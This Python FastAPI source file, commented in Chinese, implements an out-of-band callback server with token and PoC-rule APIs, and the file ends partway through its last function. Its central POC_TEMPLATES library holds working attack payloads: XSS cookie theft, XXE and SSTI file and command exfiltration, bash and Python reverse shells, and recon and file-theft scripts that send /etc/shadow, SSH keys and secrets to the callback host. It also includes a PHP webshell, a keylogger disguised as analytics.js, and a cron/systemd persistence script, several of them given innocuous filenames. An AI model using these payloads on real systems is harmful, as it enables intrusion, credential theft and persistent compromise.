"""回调服务器 API - 类似 Burp Collaborator"""
from fastapi import APIRouter, Request, Depends, HTTPException
from fastapi.responses import PlainTextResponse, Response
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, delete, func
from pydantic import BaseModel
from typing import Optional, List, Dict
from datetime import datetime, timedelta
import secrets
import asyncio
import re

from ...database import get_db
from ...models.callback import CallbackToken, CallbackRecord
from ...models.poc_rule import PocRule
from ...api.deps import get_current_user
from ...models import User
from ...config import settings

router = APIRouter()


def get_callback_url(path: str) -> str:
    """
    生成回调 URL
    如果配置了 CALLBACK_BASE_URL，返回完整 URL；否则返回相对路径
    """
    if settings.CALLBACK_BASE_URL:
        base = settings.CALLBACK_BASE_URL.rstrip('/')
        return f"{base}{path}"
    return path


# ==================== Schemas ====================
class TokenCreate(BaseModel):
    name: Optional[str] = None
    expires_hours: Optional[int] = 24  # 默认 24 小时过期


class TokenRenew(BaseModel):
    expires_hours: int = 24  # 续期时长，默认 24 小时


class TokenResponse(BaseModel):
    id: str
    token: str
    name: Optional[str]
    url: str
    created_at: datetime
    expires_at: Optional[datetime]
    is_active: bool
    record_count: int = 0

    class Config:
        from_attributes = True


class RecordResponse(BaseModel):
    id: str
    token: str
    timestamp: datetime
    client_ip: Optional[str]
    method: Optional[str]
    path: Optional[str]
    query_string: Optional[str]
    headers: Optional[dict]
    body: Optional[str]
    user_agent: Optional[str]
    protocol: str
    raw_request: Optional[str] = None  # 原始请求
    # PoC 相关字段
    is_poc_hit: bool = False
    poc_rule_name: Optional[str] = None
    is_data_exfil: bool = False  # 数据外带成功 = 攻击验证成功
    exfil_data: Optional[str] = None
    exfil_type: Optional[str] = None

    class Config:
        from_attributes = True


# ==================== Token 管理 API ====================
@router.post("/tokens", response_model=TokenResponse)
async def create_token(
    req: TokenCreate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """创建新的回调 Token"""
    # 生成短 token (12 字符，URL 友好)
    token = secrets.token_urlsafe(9)[:12]
    
    # 确保唯一性
    result = await db.execute(select(CallbackToken).where(CallbackToken.token == token))
    while result.scalar_one_or_none():
        token = secrets.token_urlsafe(9)[:12]
        result = await db.execute(select(CallbackToken).where(CallbackToken.token == token))
    
    expires_at = None
    if req.expires_hours:
        expires_at = datetime.utcnow() + timedelta(hours=req.expires_hours)
    
    db_token = CallbackToken(
        token=token,
        name=req.name,
        user_id=current_user.id,
        expires_at=expires_at,
    )
    db.add(db_token)
    await db.flush()
    await db.refresh(db_token)
    
    return TokenResponse(
        id=db_token.id,
        token=db_token.token,
        name=db_token.name,
        url=get_callback_url(f"/c/{db_token.token}"),
        created_at=db_token.created_at,
        expires_at=db_token.expires_at,
        is_active=bool(db_token.is_active),
        record_count=0
    )


@router.get("/tokens", response_model=List[TokenResponse])
async def list_tokens(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取当前用户的所有 Token"""
    result = await db.execute(
        select(CallbackToken)
        .where(CallbackToken.user_id == current_user.id)
        .order_by(CallbackToken.created_at.desc())
    )
    tokens = result.scalars().all()
    
    response = []
    for t in tokens:
        count_result = await db.execute(
            select(func.count()).select_from(CallbackRecord).where(CallbackRecord.token_id == t.id)
        )
        count = count_result.scalar() or 0
        response.append(TokenResponse(
            id=t.id,
            token=t.token,
            name=t.name,
            url=get_callback_url(f"/c/{t.token}"),
            created_at=t.created_at,
            expires_at=t.expires_at,
            is_active=bool(t.is_active),
            record_count=count
        ))
    
    return response


@router.delete("/tokens/{token_id}")
async def delete_token(
    token_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """删除 Token 及其所有记录"""
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id,
            CallbackToken.user_id == current_user.id
        )
    )
    token = result.scalar_one_or_none()
    
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    # 删除所有相关记录
    await db.execute(delete(CallbackRecord).where(CallbackRecord.token_id == token_id))
    await db.delete(token)
    
    return {"message": "Token deleted"}


@router.patch("/tokens/{token_id}/renew", response_model=TokenResponse)
async def renew_token(
    token_id: str,
    req: TokenRenew,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """续期 Token - 从当前时间起延长有效期"""
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id,
            CallbackToken.user_id == current_user.id
        )
    )
    token = result.scalar_one_or_none()
    
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    # 计算新的过期时间（从现在开始）
    if req.expires_hours > 0:
        token.expires_at = datetime.utcnow() + timedelta(hours=req.expires_hours)
    else:
        token.expires_at = None  # 永不过期
    
    # 确保 Token 是激活状态
    token.is_active = 1
    
    await db.flush()
    await db.refresh(token)
    
    # 获取记录数
    count_result = await db.execute(
        select(func.count()).select_from(CallbackRecord).where(CallbackRecord.token_id == token.id)
    )
    count = count_result.scalar() or 0
    
    return TokenResponse(
        id=token.id,
        token=token.token,
        name=token.name,
        url=get_callback_url(f"/c/{token.token}"),
        created_at=token.created_at,
        expires_at=token.expires_at,
        is_active=bool(token.is_active),
        record_count=count
    )


# ==================== 统计分析 API ====================
@router.get("/tokens/{token_id}/stats")
async def get_token_stats(
    token_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取 Token 的统计信息"""
    # 验证 token 所有权
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id,
            CallbackToken.user_id == current_user.id
        )
    )
    token = result.scalar_one_or_none()
    
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    # 总请求数
    total_result = await db.execute(
        select(func.count()).select_from(CallbackRecord).where(CallbackRecord.token_id == token_id)
    )
    total_count = total_result.scalar() or 0
    
    # 按 IP 统计
    ip_result = await db.execute(
        select(CallbackRecord.client_ip, func.count().label('count'))
        .where(CallbackRecord.token_id == token_id)
        .group_by(CallbackRecord.client_ip)
        .order_by(func.count().desc())
        .limit(10)
    )
    ip_stats = [{"ip": row[0] or "Unknown", "count": row[1]} for row in ip_result.all()]
    
    # 按 Method 统计
    method_result = await db.execute(
        select(CallbackRecord.method, func.count().label('count'))
        .where(CallbackRecord.token_id == token_id)
        .group_by(CallbackRecord.method)
    )
    method_stats = [{"method": row[0] or "Unknown", "count": row[1]} for row in method_result.all()]
    
    # 按 Path 统计
    path_result = await db.execute(
        select(CallbackRecord.path, func.count().label('count'))
        .where(CallbackRecord.token_id == token_id)
        .group_by(CallbackRecord.path)
        .order_by(func.count().desc())
        .limit(10)
    )
    path_stats = [{"path": row[0] or "/", "count": row[1]} for row in path_result.all()]
    
    # 按 User-Agent 统计
    ua_result = await db.execute(
        select(CallbackRecord.user_agent, func.count().label('count'))
        .where(CallbackRecord.token_id == token_id)
        .group_by(CallbackRecord.user_agent)
        .order_by(func.count().desc())
        .limit(10)
    )
    ua_stats = [{"user_agent": row[0] or "Unknown", "count": row[1]} for row in ua_result.all()]
    
    return {
        "total": total_count,
        "by_ip": ip_stats,
        "by_method": method_stats,
        "by_path": path_stats,
        "by_user_agent": ua_stats
    }


@router.get("/stats/all")
async def get_all_stats(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取用户所有 Token 的汇总统计"""
    # 获取用户的所有 token
    tokens_result = await db.execute(
        select(CallbackToken).where(CallbackToken.user_id == current_user.id)
    )
    tokens = tokens_result.scalars().all()
    token_ids = [t.id for t in tokens]
    
    if not token_ids:
        return {"total_tokens": 0, "total_requests": 0, "by_token": []}
    
    # 总请求数
    total_result = await db.execute(
        select(func.count()).select_from(CallbackRecord).where(CallbackRecord.token_id.in_(token_ids))
    )
    total_requests = total_result.scalar() or 0
    
    # 按 Token 统计
    token_stats = []
    for t in tokens:
        count_result = await db.execute(
            select(func.count()).select_from(CallbackRecord).where(CallbackRecord.token_id == t.id)
        )
        count = count_result.scalar() or 0
        token_stats.append({
            "token_id": t.id,
            "token": t.token,
            "name": t.name,
            "count": count,
            "created_at": t.created_at.isoformat() if t.created_at else None
        })
    
    # 按请求数排序
    token_stats.sort(key=lambda x: x["count"], reverse=True)
    
    return {
        "total_tokens": len(tokens),
        "total_requests": total_requests,
        "by_token": token_stats
    }


# ==================== 记录查询 API ====================
@router.get("/tokens/{token_id}/records", response_model=List[RecordResponse])
async def get_records(
    token_id: str,
    limit: int = 100,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取 Token 的所有回调记录"""
    # 验证 token 所有权
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id,
            CallbackToken.user_id == current_user.id
        )
    )
    token = result.scalar_one_or_none()
    
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    records_result = await db.execute(
        select(CallbackRecord)
        .where(CallbackRecord.token_id == token_id)
        .order_by(CallbackRecord.timestamp.desc())
        .limit(limit)
    )
    records = records_result.scalars().all()
    
    return [RecordResponse(
        id=r.id,
        token=r.token,
        timestamp=r.timestamp,
        client_ip=r.client_ip,
        method=r.method,
        path=r.path,
        query_string=r.query_string,
        headers=r.headers,
        body=r.body,
        user_agent=r.user_agent,
        protocol=r.protocol,
        raw_request=r.raw_request,
        is_poc_hit=bool(r.is_poc_hit),
        poc_rule_name=r.poc_rule_name,
        is_data_exfil=bool(r.is_data_exfil),
        exfil_data=r.exfil_data,
        exfil_type=r.exfil_type
    ) for r in records]


@router.delete("/tokens/{token_id}/records")
async def clear_records(
    token_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """清空 Token 的所有记录"""
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id,
            CallbackToken.user_id == current_user.id
        )
    )
    token = result.scalar_one_or_none()
    
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    delete_result = await db.execute(
        delete(CallbackRecord).where(CallbackRecord.token_id == token_id)
    )
    
    return {"deleted": delete_result.rowcount}


@router.get("/tokens/{token_id}/poll")
async def poll_records(
    token_id: str,
    since: Optional[str] = None,  # ISO 时间戳
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """轮询新记录（用于实时更新）"""
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id,
            CallbackToken.user_id == current_user.id
        )
    )
    token = result.scalar_one_or_none()
    
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    query = select(CallbackRecord).where(CallbackRecord.token_id == token_id)
    
    if since:
        try:
            since_time = datetime.fromisoformat(since.replace('Z', '+00:00'))
            query = query.where(CallbackRecord.timestamp > since_time)
        except:
            pass
    
    records_result = await db.execute(
        query.order_by(CallbackRecord.timestamp.desc()).limit(50)
    )
    records = records_result.scalars().all()
    
    return {
        "count": len(records),
        "records": [RecordResponse(
            id=r.id,
            token=r.token,
            timestamp=r.timestamp,
            client_ip=r.client_ip,
            method=r.method,
            path=r.path,
            query_string=r.query_string,
            headers=r.headers,
            body=r.body,
            user_agent=r.user_agent,
            protocol=r.protocol,
            raw_request=r.raw_request,
            is_poc_hit=bool(r.is_poc_hit),
            poc_rule_name=r.poc_rule_name,
            is_data_exfil=bool(r.is_data_exfil),
            exfil_data=r.exfil_data,
            exfil_type=r.exfil_type
        ) for r in records]
    }


# ==================== PoC 规则 API ====================
class PocRuleCreate(BaseModel):
    name: str
    description: Optional[str] = None
    status_code: int = 200
    content_type: str = 'text/html'
    response_body: Optional[str] = None
    response_headers: Optional[Dict[str, str]] = None
    redirect_url: Optional[str] = None
    delay_ms: int = 0
    enable_variables: bool = False
    filename: Optional[str] = None


class PocRuleUpdate(BaseModel):
    name: Optional[str] = None
    description: Optional[str] = None
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    response_body: Optional[str] = None
    response_headers: Optional[Dict[str, str]] = None
    redirect_url: Optional[str] = None
    delay_ms: Optional[int] = None
    enable_variables: Optional[bool] = None
    is_active: Optional[bool] = None
    filename: Optional[str] = None


class PocRuleResponse(BaseModel):
    id: str
    token_id: str
    name: str
    description: Optional[str]
    status_code: int
    content_type: str
    response_body: Optional[str]
    response_headers: Optional[Dict[str, str]]
    redirect_url: Optional[str]
    delay_ms: int
    enable_variables: bool
    is_active: bool
    hit_count: int
    url: str
    filename: Optional[str] = None
    created_at: datetime

    class Config:
        from_attributes = True


# PoC 模板库
# 外带数据参数约定:
# - _exfil=1 标记这是一个数据外带请求
# - _type=xxx 外带数据类型 (cookie/file/cmd/custom)
# - _data=xxx 或其他参数名 实际外带的数据
#
# 模板字段说明:
# - category: 模板分类 (xss/xxe/ssrf/rce/shell/script)
# - filename: 建议的文件名，设置后响应带 Content-Disposition
# - usage: 建议的使用方式（前端展示）
POC_TEMPLATES = {
    # ==================== XSS ====================
    "xss_basic": {
        "name": "xss-alert",
        "description": "基础 XSS 弹窗测试（仅验证执行）",
        "category": "xss",
        "content_type": "text/html",
        "response_body": "<script>alert(document.domain)</script>",
    },
    "xss_cookie": {
        "name": "xss-cookie",
        "description": "XSS Cookie 外带（验证+数据回传）",
        "category": "xss",
        "content_type": "text/html",
        "response_body": "<script>new Image().src='{{callback_url}}?_exfil=1&_type=cookie&_data='+encodeURIComponent(document.cookie)+'&domain='+document.domain</script>",
        "enable_variables": True,
    },
    "xss_dom": {
        "name": "xss-dom",
        "description": "XSS DOM 信息外带",
        "category": "xss",
        "content_type": "text/html",
        "response_body": "<script>fetch('{{callback_url}}?_exfil=1&_type=dom&_data='+encodeURIComponent(JSON.stringify({url:location.href,cookie:document.cookie,localStorage:Object.keys(localStorage)})))</script>",
        "enable_variables": True,
    },
    # ==================== XXE ====================
    "xxe_dtd": {
        "name": "xxe-dtd",
        "description": "XXE 外带 DTD（文件内容回传）",
        "category": "xxe",
        "content_type": "application/xml-dtd",
        "response_body": "<!ENTITY % data SYSTEM \"file:///etc/passwd\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM '{{callback_url}}?_exfil=1&_type=file&_data=%data;'>\">\n%param1;",
        "enable_variables": True,
    },
    "xxe_file": {
        "name": "xxe-file",
        "description": "XXE 文件读取（内联）",
        "category": "xxe",
        "content_type": "application/xml",
        "response_body": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>",
    },
    # ==================== SSRF ====================
    "ssrf_aws": {
        "name": "ssrf-aws",
        "description": "SSRF AWS Metadata 重定向",
        "category": "ssrf",
        "redirect_url": "http://169.254.169.254/latest/meta-data/",
        "status_code": 302,
    },
    "ssrf_gcp": {
        "name": "ssrf-gcp",
        "description": "SSRF GCP Metadata 重定向",
        "category": "ssrf",
        "redirect_url": "http://metadata.google.internal/computeMetadata/v1/",
        "status_code": 302,
    },
    "ssrf_exfil": {
        "name": "ssrf-exfil",
        "description": "SSRF 数据外带（curl）",
        "category": "ssrf",
        "content_type": "text/plain",
        "response_body": "curl '{{callback_url}}?_exfil=1&_type=ssrf&_data='$(cat /etc/passwd | base64 -w0)",
        "enable_variables": True,
    },
    # ==================== RCE ====================
    "rce_curl": {
        "name": "rce-curl",
        "description": "RCE 命令结果外带（curl）",
        "category": "rce",
        "content_type": "text/plain",
        "response_body": "curl '{{callback_url}}?_exfil=1&_type=cmd&_data='$(id | base64 -w0)",
        "enable_variables": True,
    },
    "rce_wget": {
        "name": "rce-wget",
        "description": "RCE 命令结果外带（wget）",
        "category": "rce",
        "content_type": "text/plain",
        "response_body": "wget -q -O- '{{callback_url}}?_exfil=1&_type=cmd&_data='$(whoami)",
        "enable_variables": True,
    },
    "rce_powershell": {
        "name": "rce-ps",
        "description": "RCE PowerShell 外带",
        "category": "rce",
        "content_type": "text/plain",
        "response_body": "powershell -c \"IWR '{{callback_url}}?_exfil=1&_type=cmd&_data='+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)))\"",
        "enable_variables": True,
    },
    "ssti_jinja": {
        "name": "ssti-jinja",
        "description": "SSTI Jinja2 RCE 外带",
        "category": "rce",
        "content_type": "text/plain",
        "response_body": "{{config.__class__.__init__.__globals__['os'].popen('curl \"{{callback_url}}?_exfil=1&_type=ssti&_data=\"$(id)').read()}}",
        "enable_variables": True,
    },
    # ==================== 反弹 Shell ====================
    "shell_bash": {
        "name": "shell-bash",
        "description": "Bash 反弹 Shell",
        "category": "shell",
        "content_type": "text/plain",
        "response_body": "bash -i >& /dev/tcp/{{attacker_ip}}/{{attacker_port}} 0>&1",
        "enable_variables": True,
    },
    "shell_python": {
        "name": "shell-python",
        "description": "Python 反弹 Shell",
        "category": "shell",
        "content_type": "text/plain",
        "response_body": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{attacker_ip}}\",{{attacker_port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "enable_variables": True,
    },
    # ==================== 脚本文件 ====================
    "script_bash_recon": {
        "name": "recon-linux",
        "description": "Linux 系统信息收集脚本（curl | bash）",
        "category": "script",
        "content_type": "text/plain",
        "filename": "setup.sh",
        "usage": "curl -sL {url} | bash",
        "response_body": """#!/bin/bash
CB="{{callback_url}}"
c(){ echo "=== $1 ==="; eval "$2" 2>/dev/null; echo; }
{
  c "System" "uname -a; cat /etc/os-release"
  c "User" "whoami; id; w"
  c "Network" "ip a || ifconfig; ss -tlnp || netstat -tlnp"
  c "DNS" "cat /etc/resolv.conf; cat /etc/hosts"
  c "Passwd" "cat /etc/passwd"
  c "Shadow" "cat /etc/shadow"
  c "SSH Keys" "ls -la ~/.ssh/; cat ~/.ssh/authorized_keys; cat ~/.ssh/id_rsa"
  c "Cron" "crontab -l; ls -la /etc/cron*"
  c "SUID" "find / -perm -4000 -type f 2>/dev/null | head -20"
  c "Process" "ps aux | head -40"
  c "Env" "env"
  c "History" "cat ~/.bash_history | tail -50"
  c "Docker" "docker ps; cat /proc/1/cgroup"
  c "K8s" "cat /var/run/secrets/kubernetes.io/serviceaccount/token; env | grep -i kube"
} | curl -s -X POST "$CB?_exfil=1&_type=recon" -d @-""",
        "enable_variables": True,
    },
    "script_py_recon": {
        "name": "recon-python",
        "description": "跨平台 Python 信息收集脚本",
        "category": "script",
        "content_type": "text/plain",
        "filename": "check.py",
        "usage": "curl -sL {url} | python3",
        "response_body": """#!/usr/bin/env python3
import os,sys,socket,platform,json,urllib.request,subprocess as sp
CB="{{callback_url}}"
def run(cmd):
    try: return sp.check_output(cmd,shell=True,stderr=sp.DEVNULL,timeout=10).decode(errors='replace')
    except: return ""
info={}
info["hostname"]=socket.gethostname()
info["platform"]=platform.platform()
info["arch"]=platform.machine()
info["user"]=os.getenv("USER") or os.getenv("USERNAME") or run("whoami").strip()
info["uid"]=run("id").strip()
info["cwd"]=os.getcwd()
info["pid"]=os.getpid()
info["python"]=sys.version
info["ip_internal"]=socket.gethostbyname(socket.gethostname())
info["env"]={k:v for k,v in os.environ.items() if any(x in k.upper() for x in ["KEY","SECRET","TOKEN","PASS","AWS","DB","API"])}
info["ifconfig"]=run("ip a 2>/dev/null || ifconfig 2>/dev/null")
info["passwd"]=run("cat /etc/passwd 2>/dev/null")
info["ps"]=run("ps aux 2>/dev/null | head -30")
info["home_files"]=run("ls -la ~ 2>/dev/null")
info["ssh_keys"]=run("ls -la ~/.ssh/ 2>/dev/null")
data=json.dumps(info,ensure_ascii=False,indent=2).encode()
req=urllib.request.Request(CB+"?_exfil=1&_type=recon",data=data,method="POST")
req.add_header("Content-Type","application/json")
try: urllib.request.urlopen(req,timeout=15)
except: pass""",
        "enable_variables": True,
    },
    "script_ps_recon": {
        "name": "recon-windows",
        "description": "Windows PowerShell 信息收集脚本",
        "category": "script",
        "content_type": "text/plain",
        "filename": "update.ps1",
        "usage": "powershell -ep bypass -c \"IEX(IWR '{url}')\"",
        "response_body": """$CB="{{callback_url}}"
$info=@{}
$info["hostname"]=$env:COMPUTERNAME
$info["user"]="$env:USERDOMAIN\\$env:USERNAME"
$info["os"]=(Get-CimInstance Win32_OperatingSystem).Caption
$info["arch"]=$env:PROCESSOR_ARCHITECTURE
$info["ip"]=(Get-NetIPAddress -AddressFamily IPv4 | Where {$_.IPAddress -ne "127.0.0.1"}).IPAddress -join ","
$info["domain"]=(Get-CimInstance Win32_ComputerSystem).Domain
$info["av"]=(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -EA 0).displayName -join ","
$info["ps"]=(Get-Process | Select -First 30 Name,Id,Path | ConvertTo-Json -Compress)
$info["services"]=(Get-Service | Where Status -eq Running | Select -First 20 Name | ConvertTo-Json -Compress)
$info["env"]=($env:Path)
$info["admins"]=(net localgroup administrators 2>$null) -join "`n"
$info["netstat"]=(netstat -an | Select -First 30) -join "`n"
$info["arp"]=(arp -a) -join "`n"
$info["installed"]=((Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*).DisplayName | Select -First 20) -join ","
$json=[System.Text.Encoding]::UTF8.GetBytes(($info|ConvertTo-Json -Compress))
try{IWR -Uri "$CB`?_exfil=1&_type=recon" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 15}catch{}""",
        "enable_variables": True,
    },
    "script_bash_exfil": {
        "name": "exfil-files",
        "description": "批量文件外带脚本（支持指定目录）",
        "category": "script",
        "content_type": "text/plain",
        "filename": "check.sh",
        "usage": "curl -sL {url} | bash",
        "response_body": """#!/bin/bash
CB="{{callback_url}}"
TARGETS="/etc/passwd /etc/shadow /etc/hosts /etc/crontab"
TARGETS="$TARGETS $(find /home -name '.bash_history' -o -name '.env' -o -name 'id_rsa' -o -name '*.conf' 2>/dev/null | head -20)"
TARGETS="$TARGETS $(find /var/www -name '*.php' -o -name '*.env' -o -name 'config*' 2>/dev/null | head -20)"
TARGETS="$TARGETS $(find /opt /srv -name '*.yml' -o -name '*.yaml' -o -name '*.json' -o -name '.env' 2>/dev/null | head -20)"
for f in $TARGETS; do
  [ -r "$f" ] && {
    data=$(base64 -w0 "$f" 2>/dev/null || base64 "$f" 2>/dev/null)
    curl -s "$CB?_exfil=1&_type=file&filename=$(echo $f|base64 -w0)&_data=$data" -o /dev/null
    sleep 0.2
  }
done""",
        "enable_variables": True,
    },
    "script_py_revshell": {
        "name": "revshell-python",
        "description": "Python 反弹 Shell 脚本（带 PTY）",
        "category": "script",
        "content_type": "text/plain",
        "filename": "svc.py",
        "usage": "curl -sL {url} | python3",
        "response_body": """#!/usr/bin/env python3
import socket,subprocess,os,pty,sys
HOST="{{attacker_ip}}"
PORT={{attacker_port}}
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,int(PORT)))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
except:
    sys.exit(0)""",
        "enable_variables": True,
    },
    "script_php_webshell": {
        "name": "webshell-php",
        "description": "PHP 一句话 Webshell（密码保护）",
        "category": "script",
        "content_type": "application/x-httpd-php",
        "filename": "config.php",
        "response_body": "<?php if(md5($_GET['k'])!=='{{param.keyhash}}'){die('404');}@eval($_POST['cmd']);?>\n<?php /* Usage: ?k=yourkey POST cmd=phpinfo(); */ ?>",
        "enable_variables": True,
    },
    "script_js_keylogger": {
        "name": "keylogger-js",
        "description": "JavaScript 键盘记录器脚本",
        "category": "script",
        "content_type": "text/javascript",
        "filename": "analytics.js",
        "usage": "<script src=\"{url}\"></script>",
        "response_body": """(function(){var b="",u="{{callback_url}}";document.addEventListener("keypress",function(e){b+=e.key;if(b.length>=20){new Image().src=u+"?_exfil=1&_type=keylog&_data="+encodeURIComponent(b)+"&page="+encodeURIComponent(location.href);b=""}});document.addEventListener("submit",function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v});new Image().src=u+"?_exfil=1&_type=form&_data="+encodeURIComponent(JSON.stringify(d))})})();""",
        "enable_variables": True,
    },
    "script_bash_persist": {
        "name": "persist-cron",
        "description": "Linux Cron 持久化脚本",
        "category": "script",
        "content_type": "text/plain",
        "filename": "install.sh",
        "usage": "curl -sL {url} | bash",
        "response_body": """#!/bin/bash
CB="{{callback_url}}"
PAYLOAD="curl -s $CB?_exfil=1&_type=beacon&_data=$(hostname)-$(whoami) > /dev/null 2>&1"
# cron 持久化
(crontab -l 2>/dev/null; echo "*/5 * * * * $PAYLOAD") | sort -u | crontab - 2>/dev/null
# bashrc 持久化
grep -q "$CB" ~/.bashrc 2>/dev/null || echo "$PAYLOAD" >> ~/.bashrc 2>/dev/null
# systemd timer（需要 root）
if [ "$(id -u)" -eq 0 ]; then
cat > /etc/systemd/system/syscheck.service << 'SVC'
[Unit]
Description=System Check
[Service]
Type=oneshot
ExecStart=/bin/bash -c "PAYLOAD_CMD"
SVC
sed -i "s|PAYLOAD_CMD|$PAYLOAD|g" /etc/systemd/system/syscheck.service
cat > /etc/systemd/system/syscheck.timer << 'TMR'
[Unit]
Description=System Check Timer
[Timer]
OnBootSec=60
OnUnitActiveSec=300
[Install]
WantedBy=timers.target
TMR
systemctl daemon-reload && systemctl enable --now syscheck.timer 2>/dev/null
fi
$PAYLOAD""",
        "enable_variables": True,
    },
}


@router.get("/poc-templates")
async def get_poc_templates():
    """获取 PoC 模板库"""
    return {"templates": POC_TEMPLATES}


@router.post("/tokens/{token_id}/rules", response_model=PocRuleResponse)
async def create_poc_rule(
    token_id: str,
    req: PocRuleCreate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """创建 PoC 规则"""
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id,
            CallbackToken.user_id == current_user.id
        )
    )
    token = result.scalar_one_or_none()
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    existing = await db.execute(
        select(PocRule).where(PocRule.token_id == token_id, PocRule.name == req.name)
    )
    if existing.scalar_one_or_none():
        raise HTTPException(status_code=400, detail="Rule name already exists")
    
    rule = PocRule(
        token_id=token_id,
        name=req.name,
        description=req.description,
        status_code=req.status_code,
        content_type=req.content_type,
        response_body=req.response_body,
        response_headers=req.response_headers or {},
        redirect_url=req.redirect_url,
        delay_ms=req.delay_ms,
        enable_variables=1 if req.enable_variables else 0,
        filename=req.filename,
    )
    db.add(rule)
    await db.flush()
    await db.refresh(rule)
    
    return PocRuleResponse(
        id=rule.id, token_id=rule.token_id, name=rule.name,
        description=rule.description, status_code=rule.status_code,
        content_type=rule.content_type, response_body=rule.response_body,
        response_headers=rule.response_headers, redirect_url=rule.redirect_url,
        delay_ms=rule.delay_ms, enable_variables=bool(rule.enable_variables),
        is_active=bool(rule.is_active), hit_count=rule.hit_count,
        url=get_callback_url(f"/c/{token.token}/p/{rule.name}"),
        filename=rule.filename, created_at=rule.created_at
    )


@router.get("/tokens/{token_id}/rules", response_model=List[PocRuleResponse])
async def list_poc_rules(
    token_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """获取 PoC 规则列表"""
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id, CallbackToken.user_id == current_user.id
        )
    )
    token = result.scalar_one_or_none()
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    rules_result = await db.execute(
        select(PocRule).where(PocRule.token_id == token_id).order_by(PocRule.created_at.desc())
    )
    rules = rules_result.scalars().all()
    
    return [PocRuleResponse(
        id=r.id, token_id=r.token_id, name=r.name, description=r.description,
        status_code=r.status_code, content_type=r.content_type,
        response_body=r.response_body, response_headers=r.response_headers,
        redirect_url=r.redirect_url, delay_ms=r.delay_ms,
        enable_variables=bool(r.enable_variables), is_active=bool(r.is_active),
        hit_count=r.hit_count, url=get_callback_url(f"/c/{token.token}/p/{r.name}"),
        filename=r.filename, created_at=r.created_at
    ) for r in rules]


@router.patch("/tokens/{token_id}/rules/{rule_id}", response_model=PocRuleResponse)
async def update_poc_rule(
    token_id: str, rule_id: str, req: PocRuleUpdate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """更新 PoC 规则"""
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id, CallbackToken.user_id == current_user.id
        )
    )
    token = result.scalar_one_or_none()
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    rule_result = await db.execute(
        select(PocRule).where(PocRule.id == rule_id, PocRule.token_id == token_id)
    )
    rule = rule_result.scalar_one_or_none()
    if not rule:
        raise HTTPException(status_code=404, detail="Rule not found")
    
    update_data = req.model_dump(exclude_unset=True)
    if 'enable_variables' in update_data:
        update_data['enable_variables'] = 1 if update_data['enable_variables'] else 0
    if 'is_active' in update_data:
        update_data['is_active'] = 1 if update_data['is_active'] else 0
    
    for key, value in update_data.items():
        setattr(rule, key, value)
    
    await db.flush()
    await db.refresh(rule)
    
    return PocRuleResponse(
        id=rule.id, token_id=rule.token_id, name=rule.name,
        description=rule.description, status_code=rule.status_code,
        content_type=rule.content_type, response_body=rule.response_body,
        response_headers=rule.response_headers, redirect_url=rule.redirect_url,
        delay_ms=rule.delay_ms, enable_variables=bool(rule.enable_variables),
        is_active=bool(rule.is_active), hit_count=rule.hit_count,
        url=get_callback_url(f"/c/{token.token}/p/{rule.name}"),
        filename=rule.filename, created_at=rule.created_at
    )


@router.delete("/tokens/{token_id}/rules/{rule_id}")
async def delete_poc_rule(
    token_id: str, rule_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """删除 PoC 规则"""
    result = await db.execute(
        select(CallbackToken).where(
            CallbackToken.id == token_id, CallbackToken.user_id == current_user.id
        )
    )
    if not result.scalar_one_or_none():
        raise HTTPException(status_code=404, detail="Token not found")
    
    delete_result = await db.execute(
